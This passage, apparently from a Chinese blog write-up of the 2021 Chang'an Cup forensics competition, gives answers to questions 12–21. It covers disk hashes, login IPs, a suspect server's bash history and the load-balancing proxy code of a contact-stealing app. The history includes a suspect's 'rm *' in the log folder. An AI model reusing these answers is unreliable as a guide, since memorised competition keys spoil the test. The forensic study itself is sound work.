writableDatabase = dbHelper.getWritableDatabase(getMD5(bytesToHex(key).substring(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>)));<br></code></pre></td></tr></table></figure><p>先转成十六进制<code>616263646566</code><br>然后取<code>[1,3)</code>的值进行md5计算，得到<code>c74d97b01eae257e44aa9d5bade97baf</code></p><h2 id="第十二题"><a href="#第十二题" class="headerlink" title="第十二题"></a>第十二题</h2><h3 id="检材二的原始硬盘的SHA256值为："><a href="#检材二的原始硬盘的SHA256值为：" class="headerlink" title="检材二的原始硬盘的SHA256值为："></a>检材二的原始硬盘的SHA256值为：</h3><p>先使用第七题的答案进行解压</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">www.ho<span class="hljs-symbol">nglian7001</span>.com<br></code></pre></td></tr></table></figure><p>使用X-Ways挂载后计算哈希值，得到<br><code>E6873068B83AF9988D297C6916329CEC9D8BCB672C6A894D393E68764391C589</code></p><h2 id="第十三题"><a href="#第十三题" class="headerlink" title="第十三题"></a>第十三题</h2><h3 id="查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111-111-111-111】"><a href="#查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111-111-111-111】" class="headerlink" title="查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111.111.111.111】"></a>查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111.111.111.111】</h3><p>在<code>/var/log/wtmp</code>查看登录日志<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504211832566.png"><br>因此为<code>192.168.110.203</code></p><h2 id="第十四题"><a href="#第十四题" class="headerlink" title="第十四题"></a>第十四题</h2><h3 id="请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】"><a href="#请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】" class="headerlink" title="请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】"></a>请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250504223019653.png"><br>火眼创建虚拟机<br>进入虚拟机后，尝试查看历史命令，由于普通用户能查看的历史命令有限，先使用<code>su root</code>进入root用户再使用<code>history</code>查看历史命令</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-number">1</span>  ls<br>   <span class="hljs-number">2</span>  <span class="hljs-keyword">cd</span> Desktop/<br>   <span class="hljs-number">3</span>  ls<br>   <span class="hljs-number">4</span>  uname -a<br>   <span class="hljs-number">5</span>  cat /etc/issue<br>   <span class="hljs-number">6</span>  lsb_release -a<br>   <span class="hljs-number">7</span>  cat /<span class="hljs-keyword">proc</span>/cpuinfo <br>   8<span class="hljs-title">  hostname</span><br>   9<span class="hljs-title">  whoiam</span><br>  10<span class="hljs-title">  whoani</span><br>  11<span class="hljs-title">  whoami</span><br>  12<span class="hljs-title">  lspci</span><br>  13<span class="hljs-title">  env</span><br>  14<span class="hljs-title">  lsusb</span><br>  15<span class="hljs-title">  cat</span> /<span class="hljs-keyword">proc</span>/meminfo <br>  16<span class="hljs-title">  df</span> -h<br>  17<span class="hljs-title">  fsdisk</span> -l<br>  18<span class="hljs-title">  fdisk</span> -l<br>  19<span class="hljs-title">  ps</span> aux<br>  20<span class="hljs-title">  ps</span> -ef<br>  21<span class="hljs-title">  crontab</span> -l<br>  22<span class="hljs-title">  services</span> --status-all<br>  23<span class="hljs-title">  service</span> --status-all<br>  24<span class="hljs-title">  service</span><br>  25<span class="hljs-title">  service</span> --status-all<br>  26<span class="hljs-title">  systemctl</span><br>  27<span class="hljs-title">  systemctl</span> --help<br>  28<span class="hljs-title">  systemctl</span> -all<br>  29<span class="hljs-title">  ls</span><br>  30<span class="hljs-title">  init</span> 3<br>  31<span class="hljs-title">  ls</span><br>  32<span class="hljs-title">  cd</span> /<br>  33<span class="hljs-title">  ls</span><br>  34<span class="hljs-title">  cd</span> opt<br>  35<span class="hljs-title">  ls</span><br>  36<span class="hljs-title">  cd</span> honglianjingsai/<br>  37<span class="hljs-title">  ls</span><br>  38<span class="hljs-title">  cd</span> chronusNode/<br>  39<span class="hljs-title">  ls</span><br>  40<span class="hljs-title">  cd</span> logs<br>  41<span class="hljs-title">  ls</span><br>  42<span class="hljs-title">  rm</span> *<br>  43<span class="hljs-title">  ls</span><br>  44<span class="hljs-title">  ip</span> a<br>  45<span class="hljs-title">  init</span> 3<br>  46<span class="hljs-title">  ls</span><br>  47<span class="hljs-title">  who</span><br>  48<span class="hljs-title">  w</span><br>  49<span class="hljs-title">  cd</span> /opt/<br>  50<span class="hljs-title">  ls</span><br>  51<span class="hljs-title">  cd</span> honglianjingsai/<br>  52<span class="hljs-title">  ls</span><br>  53<span class="hljs-title">  cdd</span> chronusNode/<br>  54<span class="hljs-title">  cd</span> chronusNode/<br>  55  ;s<br>  56<span class="hljs-title">  ls</span><br>  57<span class="hljs-title">  cd</span> controller/<br>  58<span class="hljs-title">  ls</span><br>  59<span class="hljs-title">  ls</span> -l<br>  60<span class="hljs-title">  date</span><br>  61<span class="hljs-title">  history</span><br>  62<span class="hljs-title">  ls</span><br>  63<span class="hljs-title">  cd</span> ..<br>  64<span class="hljs-title">  ls</span><br>  65<span class="hljs-title">  cd</span> logs/<br>  66<span class="hljs-title">  ls</span><br>  67<span class="hljs-title">  ls</span> -l<br>  68<span class="hljs-title">  ls</span><br>  69<span class="hljs-title">  cd</span> ..<br>  70  ;s<br>  71<span class="hljs-title">  ls</span><br>  72<span class="hljs-title">  cd</span> controller/<br>  73<span class="hljs-title">  l;s</span><br>  74<span class="hljs-title">  ls</span><br>  75<span class="hljs-title">  cd</span> ..<br>  76<span class="hljs-title">  l;s</span><br>  77<span class="hljs-title">  ls</span><br>  78<span class="hljs-title">  cd</span> static/<br>  79<span class="hljs-title">  ls</span><br>  80<span class="hljs-title">  cd</span> .<br>  81<span class="hljs-title">  cd</span> ..<br>  82<span class="hljs-title">  ls</span><br>  83<span class="hljs-title">  cd</span> uploads/<br>  84<span class="hljs-title">  ls</span><br>  85<span class="hljs-title">  cd</span> ..<br>  86<span class="hljs-title">  ls</span><br>  87<span class="hljs-title">  cd</span> ..<br>  88<span class="hljs-title">  ls</span><br>  89<span class="hljs-title">  more</span> README.txt <br>  90<span class="hljs-title">  ifconfig</span><br>  91<span class="hljs-title">  netstat</span> -anpt<br>  92<span class="hljs-title">  init</span> 3<br>  93<span class="hljs-title">  vi</span> /etc/sysconfig/network-scripts/ifcfg-ens33 <br>  94<span class="hljs-title">  reboot</span><br>  95<span class="hljs-title">  ifconfig</span><br>  96<span class="hljs-title">  init</span> 3<br>  97<span class="hljs-title">  ls</span><br>  98<span class="hljs-title">  firewall-cmd</span> --add-port 80/tcp<br>  99<span class="hljs-title">  systemctl</span> start<span class="hljs-title"> firewalld</span><br> 100<span class="hljs-title">  firewall-cmd</span> --add-port 80/tcp<br> 101<span class="hljs-title">  ip</span> a<br> 102<span class="hljs-title">  cd</span> /opt<br> 103<span class="hljs-title">  ls</span><br> 104<span class="hljs-title">  cd</span> honglianjingsai/<br> 105<span class="hljs-title">  ls</span><br> 106<span class="hljs-title">  cd</span> chronusNode/<br> 107<span class="hljs-title">  ls</span><br> 108<span class="hljs-title">  cd</span> controller/<br> 109<span class="hljs-title">  ls</span><br> 110<span class="hljs-title">  vi</span> ADProxy.js <br> 111<span class="hljs-title">  ls</span><br> 112<span class="hljs-title">  cd</span> /opt/<br> 113<span class="hljs-title">  ls</span><br> 114<span class="hljs-title">  cd</span> honglianjingsai/<br> 115<span class="hljs-title">  ls</span><br> 116<span class="hljs-title">  cd</span> chronusNode/<br> 117<span class="hljs-title">  ls</span><br> 118<span class="hljs-title">  cd</span> controller/<br> 119<span class="hljs-title">  ls</span><br> 120<span class="hljs-title">  more</span> ADProxy.js<br> 121<span class="hljs-title">  clear</span><br> 122<span class="hljs-title">  ls</span><br> 123<span class="hljs-title">  cd</span> ..<br> 124<span class="hljs-title">  ls</span><br> 125<span class="hljs-title">  node</span> app.js <br> 126<span class="hljs-title">  clear</span><br> 127<span class="hljs-title">  history</span><br> 128<span class="hljs-title">  cd</span> /opt/honglianjingsai/<br> 129<span class="hljs-title">  ls</span><br> 130<span class="hljs-title">  cd</span> chronusNode/<br> 131<span class="hljs-title">  ls</span><br> 132<span class="hljs-title">  cd</span> controller/<br> 133<span class="hljs-title">  ls</span><br> 134<span class="hljs-title">  vi</span> ADProxy.js <br> 135<span class="hljs-title">  yum</span> vim<br> 136<span class="hljs-title">  yum</span> install<span class="hljs-title"> vim</span><br> 137<span class="hljs-title">  ls</span><br> 138<span class="hljs-title">  ping</span> www.baidu.com<br> 139<span class="hljs-title">  ping</span> baidu.com<br> 140<span class="hljs-title">  yum</span> install<span class="hljs-title"> vim</span><br> 141<span class="hljs-title">  vim</span> ADProxy.js <br> 142<span class="hljs-title">   more</span> ADProxy.js <br> 143<span class="hljs-title">  vim</span> ADProxy.js <br> 144<span class="hljs-title">  cd</span> ..<br> 145<span class="hljs-title">  lsls</span><br> 146<span class="hljs-title">  ls</span><br> 147<span class="hljs-title">  more</span> README.txt <br> 148<span class="hljs-title">  cd</span> chronusNode/controller/<br> 149<span class="hljs-title">  vim</span> ADProxy.js <br> 150<span class="hljs-title">  cd</span> ..<br> 151<span class="hljs-title">  ls</span><br> 152<span class="hljs-title">  vim</span> const.js <br> 153<span class="hljs-title">  firewall-cmd</span> --zone=public --add-port=80/tcp --permanent<br> 154<span class="hljs-title">  ifconfig</span><br> 155<span class="hljs-title">  ping</span> 192.168.110.111<br> 156<span class="hljs-title">  ls</span><br> 157<span class="hljs-title">  cd</span> controller/<br> 158<span class="hljs-title">  ls</span><br> 159<span class="hljs-title">  vim</span> ADProxy.js <br> 160<span class="hljs-title">  firewall-cmd</span> --add-port=80/tcp --permanent<br> 161<span class="hljs-title">  systemctl</span> stop<span class="hljs-title"> firewalld</span><br> 162<span class="hljs-title">  vim</span> ADProxy.js <br> 163<span class="hljs-title">  LS</span><br> 164<span class="hljs-title">  ls</span><br> 165<span class="hljs-title">  cd</span> ..<br> 166<span class="hljs-title">  ls</span><br> 167<span class="hljs-title">  cd</span> logs/<br> 168<span class="hljs-title">  ls</span><br> 169<span class="hljs-title">  more</span> 2021-4-23-6-34.log <br> 170<span class="hljs-title">  more</span> 2021-4-23-6-31.log <br> 171<span class="hljs-title">  cd</span> ..<br> 172<span class="hljs-title">  cd</span> controller/<br> 173<span class="hljs-title">  ls</span><br> 174<span class="hljs-title">  vim</span> ADProxy.js <br> 175<span class="hljs-title">  vim</span> /etc/hosts<br> 176<span class="hljs-title">  vim</span> ADProxy.js <br> 177<span class="hljs-title">  cd</span> ..<br> 178<span class="hljs-title">  ls</span><br> 179<span class="hljs-title">  node</span> app.js<br> 180<span class="hljs-title">  reboot</span><br> 181<span class="hljs-title">  cd</span> /opt<br> 182<span class="hljs-title">  ls</span><br> 183<span class="hljs-title">  cd</span> honglianjingsai/<br> 184<span class="hljs-title">  ls</span><br> 185<span class="hljs-title">  cd</span> chronusNode/<br> 186<span class="hljs-title">  ls</span><br> 187<span class="hljs-title">  node</span> app.js<br> 188<span class="hljs-title">  history</span><br> 189<span class="hljs-title">  cd</span> /opt/<br> 190<span class="hljs-title">  cd</span> honglianjingsai/<br> 191<span class="hljs-title">  ls</span><br> 192<span class="hljs-title">  cd</span> chronusNode/<br> 193<span class="hljs-title">  cd</span> controller/<br> 194<span class="hljs-title">  ls</span><br> 195<span class="hljs-title">  vim</span> ADProxy.js <br> 196<span class="hljs-title">  cd</span> ..<br> 197<span class="hljs-title">  ls</span><br> 198<span class="hljs-title">  cd</span> logs/<br> 199<span class="hljs-title">  l;s</span><br> 200<span class="hljs-title">  ls</span><br> 201<span class="hljs-title">  ll</span><br> 202<span class="hljs-title">  vim</span> 2021-4-23-17-36.log <br> 203<span class="hljs-title">  cd</span> /opt/<br> 204<span class="hljs-title">  ls</span><br> 205<span class="hljs-title">  cd</span> honglianjingsai/<br> 206<span class="hljs-title">  ls</span><br> 207<span class="hljs-title">  cd</span> chronusNode/<br> 208<span class="hljs-title">  ls</span><br> 209<span class="hljs-title">  cd</span> controller/<br> 210<span class="hljs-title">  ls</span><br> 211<span class="hljs-title">  vim</span> ADProxy.js <br> 212<span class="hljs-title">  history</span><br> 213<span class="hljs-title">  reboot</span><br> 214<span class="hljs-title">  cd</span> /opt/honglianjingsai/<br> 215<span class="hljs-title">  ls</span><br> 216<span class="hljs-title">  cd</span> chronusNode/<br> 217<span class="hljs-title">  ls</span><br> 218<span class="hljs-title">  cd</span> logs<br> 219<span class="hljs-title">  ls</span> -la<br> 220<span class="hljs-title">  cat</span> 2021-4-23-6-53.log <br> 221<span class="hljs-title">  cat</span> 2021-4-23-17-39.log <br> 222<span class="hljs-title">  date</span><br> 223<span class="hljs-title">  systemctl</span> start<span class="hljs-title"> firewalld</span><br> 224<span class="hljs-title">  firewall-cmd</span> --add-port 80/tcp<br> 225<span class="hljs-title">  cd</span> ..<br> 226<span class="hljs-title">  ls</span><br> 227<span class="hljs-title">  cd</span> controller/<br> 228<span class="hljs-title">  ls</span><br> 229<span class="hljs-title">  vi</span> ADProxy.js <br> 230<span class="hljs-title">  ls</span><br> 231<span class="hljs-title">  vi</span> ADTCPDeliver.js <br> 232<span class="hljs-title">  vi</span> ADFileServer.js <br> 233<span class="hljs-title">  ls</span><br> 234<span class="hljs-title">  cd</span> ..<br> 235<span class="hljs-title">  ls</span><br> 236<span class="hljs-title">  vi</span> app.js <br> 237<span class="hljs-title">  ls</span><br> 238<span class="hljs-title">  cd</span> controller/<br> 239<span class="hljs-title">  ls</span><br> 240<span class="hljs-title">  vi</span> ADProxy.js <br> 241<span class="hljs-title">  ls</span><br> 242<span class="hljs-title">  cd</span> ..<br> 243<span class="hljs-title">  ls</span><br> 244<span class="hljs-title">  cd</span> model/<br> 245<span class="hljs-title">  ls</span><br> 246<span class="hljs-title">  cd</span> ..<br> 247<span class="hljs-title">  ls</span><br> 248<span class="hljs-title">  cd</span> node_modules/<br> 249<span class="hljs-title">  ls</span><br> 250<span class="hljs-title">  ifconfig</span><br> 251<span class="hljs-title">  reboot</span><br> 252<span class="hljs-title">  clear</span><br> 253<span class="hljs-title">  cd</span> /opt/honglianjingsai/chronusNode/<br> 254<span class="hljs-title">  ls</span><br> 255<span class="hljs-title">  cd</span> logs/<br> 256<span class="hljs-title">  ls</span><br> 257<span class="hljs-title">  ls</span> -la<br> 258<span class="hljs-title">  cd</span> .<br> 259<span class="hljs-title">  ls</span><br> 260<span class="hljs-title">  ls</span> -la<br> 261<span class="hljs-title">  date</span><br> 262<span class="hljs-title">  vim</span> 2021-4-23-18-59.log <br> 263<span class="hljs-title">  date</span><br> 264<span class="hljs-title">  timedatectl</span><br> 265<span class="hljs-title">  timedatectl</span> set-timezone<span class="hljs-title"> UTC</span><br> 266<span class="hljs-title">  timedatectl</span><br> 267<span class="hljs-title">  date</span><br> 268<span class="hljs-title">  ls</span><br> 269<span class="hljs-title">  last</span><br> 270<span class="hljs-title">  clear</span><br> 271<span class="hljs-title">  ififconfigiig</span><br> 272<span class="hljs-title">  ifconfig</span><br> 273<span class="hljs-title">  reboot</span><br> 274<span class="hljs-title">  clear</span><br> 275<span class="hljs-title">  ifconfig</span><br> 276<span class="hljs-title">  ifconfig</span><br> 277<span class="hljs-title">  cd</span> /opt/honglianjingsai/chronusNode/<br> 278<span class="hljs-title">  node</span> app.js <br> 279<span class="hljs-title">  shutdown</span> -r<span class="hljs-title"> now</span><br><br></code></pre></td></tr></table></figure><p>从后面几题可以看出，该服务器主要实现对不同服务器的转发，因此功能为<code>负载均衡</code></p><h2 id="第十五题"><a href="#第十五题" class="headerlink" title="第十五题"></a>第十五题</h2><h3 id="上一题中，提到的主要功能对应的服务监听的端口为："><a href="#上一题中，提到的主要功能对应的服务监听的端口为：" class="headerlink" title="上一题中，提到的主要功能对应的服务监听的端口为："></a>上一题中，提到的主要功能对应的服务监听的端口为：</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506170716864.png"><br>打开<code>chronusNode/const.js</code>，得到服务器基本配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">*</span> <span class="hljs-string">服务器基本配置</span> <span class="hljs-string">*/</span><br>    <span class="hljs-attr">server_config :</span> &#123;<br>        <span class="hljs-attr">host :</span> <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<br>        <span class="hljs-attr">port :</span> <span class="hljs-number">80</span>,<br>        <span class="hljs-attr">safe_port :</span> <span class="hljs-number">8443</span>,<br>        <span class="hljs-attr">static_path :</span> <span class="hljs-string">&#x27;static&#x27;</span>,<br>        <span class="hljs-attr">static_host :</span> <span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>    &#125;<span class="hljs-string">,</span><br></code></pre></td></tr></table></figure><p>因此得到端口为<code>80</code></p><h2 id="第十六题"><a href="#第十六题" class="headerlink" title="第十六题"></a>第十六题</h2><h3 id="上一题中，提到的服务所使用的启动命令为："><a href="#上一题中，提到的服务所使用的启动命令为：" class="headerlink" title="上一题中，提到的服务所使用的启动命令为："></a>上一题中，提到的服务所使用的启动命令为：</h3><p>从历史命令</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">277 </span> cd /opt/honglianjingsai/chronusNode/<br><span class="hljs-symbol">278 </span> node app.js <br><span class="hljs-symbol">279 </span> shutdown -r now<br></code></pre></td></tr></table></figure><p>可以看出，启动命令为：<code>node app.js</code></p><h2 id="第十七题"><a href="#第十七题" class="headerlink" title="第十七题"></a>第十七题</h2><h3 id="经分析，该服务对于请求来源IP的处理依据是：根据请求源IP地址的第（）位进行判断【标准格式：9】"><a href="#经分析，该服务对于请求来源IP的处理依据是：根据请求源IP地址的第（）位进行判断【标准格式：9】" class="headerlink" title="经分析，该服务对于请求来源IP的处理依据是：根据请求源IP地址的第（）位进行判断【标准格式：9】"></a>经分析，该服务对于请求来源IP的处理依据是：根据请求源IP地址的第（）位进行判断【标准格式：9】</h3><p>在<code>/chronusNode/controller/ADProxy.js</code>中进行查看<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506171808235.png"><br>得到是<code>clientIPArr[2]</code>，即第<code>3</code>位</p><h2 id="第十八题"><a href="#第十八题" class="headerlink" title="第十八题"></a>第十八题</h2><h3 id="经分析，当判断条件小于50时，服务器会将该请求转发到IP为（）的服务器上【标准格式：111-111-111-111】"><a href="#经分析，当判断条件小于50时，服务器会将该请求转发到IP为（）的服务器上【标准格式：111-111-111-111】" class="headerlink" title="经分析，当判断条件小于50时，服务器会将该请求转发到IP为（）的服务器上【标准格式：111.111.111.111】"></a>经分析，当判断条件小于50时，服务器会将该请求转发到IP为（）的服务器上【标准格式：111.111.111.111】</h3><p>在代码中得到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (clientIP3Int &lt;= <span class="hljs-number">50</span>) &#123;<br>                        <span class="hljs-variable language_">global</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">&#x27;[Proxy_Destination] -&gt; &#x27;</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(_proxy50));<br>                        <span class="hljs-keyword">return</span> _proxy50<br><br></code></pre></td></tr></table></figure><p>同时在上面代码有：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> _proxy50 = &#123;<br>        <span class="hljs-attr">protocol</span>: <span class="hljs-string">&#x27;http:&#x27;</span>,<br>        <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;192.168.110.111&#x27;</span>,<br>        <span class="hljs-attr">port</span>: <span class="hljs-number">80</span><br>    &#125;<br><br></code></pre></td></tr></table></figure><p>因此会发到<code>192.168.110.111</code></p><h2 id="第十九题"><a href="#第十九题" class="headerlink" title="第十九题"></a>第十九题</h2><h3 id="请分析，该服务器转发的目标服务器一共有几台【标准格式：9】"><a href="#请分析，该服务器转发的目标服务器一共有几台【标准格式：9】" class="headerlink" title="请分析，该服务器转发的目标服务器一共有几台【标准格式：9】"></a>请分析，该服务器转发的目标服务器一共有几台【标准格式：9】</h3><p><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506172444582.png"><br>可以看到，是<code>3</code>台</p><h2 id="第二十题"><a href="#第二十题" class="headerlink" title="第二十题"></a>第二十题</h2><h3 id="请分析，受害者通讯录被获取时，其设备的IP地址为【标准格式：111-111-111-111】"><a href="#请分析，受害者通讯录被获取时，其设备的IP地址为【标准格式：111-111-111-111】" class="headerlink" title="请分析，受害者通讯录被获取时，其设备的IP地址为【标准格式：111.111.111.111】"></a>请分析，受害者通讯录被获取时，其设备的IP地址为【标准格式：111.111.111.111】</h3><p>查看日志目录，发现受害者通信录被获取时，即4.24，只存在一个日志文件<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506173549926.png"><br>查看得到<br><img src="/2025/05/03/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E9%95%BF%E5%AE%89%E6%9D%AF2021%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/file-20250506173631233.png"><br>即<code>192.168.110.252</code></p><h2 id="第二十一题"><a href="#第二十一题" class="headerlink" title="第二十一题"></a>第二十一题</h2><h3 id="请分析，受害者的通讯录被窃取之后，经由该服务器转发到了IP为（）的服务器上【标准格-式：111-111-111-111】"><a href="#请分析，受害者的通讯录被窃取之后，经由该服务器转发到了IP为（）的服务器上【标准格-式：111-111-111-111】" class="headerlink" title="请分析，受害者的通讯录被窃取之后，经由该服务器转发到了IP为（）的服务器上【标准格 式：111.111.111.111】"></a>请分析，受害者的通讯录被窃取之后，经由该服务器转发到了IP为（）的服务器上【标准格 